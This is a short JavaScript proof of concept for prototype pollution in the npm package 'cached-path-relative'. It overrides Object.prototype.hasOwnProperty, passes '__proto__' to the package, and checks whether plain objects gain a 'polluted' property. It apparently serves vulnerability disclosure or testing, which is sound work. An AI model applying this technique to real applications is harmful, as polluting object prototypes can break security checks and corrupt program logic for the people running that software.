Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
var relative = require('cached-path-relative');
relative('__proto__', 'polluted');
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}